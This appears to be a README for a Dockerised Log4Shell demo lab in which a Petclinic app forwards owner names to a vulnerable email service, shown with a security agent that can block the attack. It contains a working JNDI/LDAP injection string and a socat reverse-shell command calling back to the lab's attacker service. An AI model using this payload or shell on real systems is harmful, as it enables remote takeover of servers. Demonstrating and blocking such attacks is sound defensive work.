

## Contrast Configuration

Before Starting up, you will need to configure the agent, by setting the credentials in the contrast_security.yaml. DO NOT CHECK THIS IN TO GIT.
During the docker build process it will download the latest agent version.
Whether Assess or Protect are enabled are controlled by environment variables in the docker-compose.yaml file. This allows you to quickly enable/disable Assess/Protect without rebuilding the docker images.
Just change the values and restart ( docker-compose up ).

## Setup


Run the services up using docker ( from the root of the project )
```docker-compose up```

Once up, login to the log4shell service and open socat using the following command
```docker exec -it Log4ShellServer bash -c "/ListenForShell.sh"```

Then open a browser and access Petclinic
http://localhost:8080
Login as admin : password
Add a new Owner and add the following to the first or last name
```${jndi:ldap://log4shell-service:1389/jdk8}```
Once the owner is saved, you will be able to execute commands from the log4shell terminal.
The commands are run on the EmailService OS.



## What Is Happening

When you send the payload to the Petclinic application via the Owner firstname/lastname the following occurs.
* Petclinic sends the Owner details to the Email Service
* The Email Service logs that information using a vulnerable version of log4j
* Log4j initiates a JNDI/LDAP connection to the Log4Shell service and downloads a class
* That class is executed within the Email Service, which in turn executes the following commmand on the underlying OS of the Email Service
  * "socat TCP4:log4shell-service:8082 EXEC:/bin/bash"
* This, uses Socat create a reverse shell which calls back to the Log4Shell Service, allowing the terminal in Log4Shell to execute arbitrary commands on the Email Service and see the results.

## How to Block
* This can be blocked by Protect by setting to BLOCK in the Email Service the log4shell or JNDI rules.




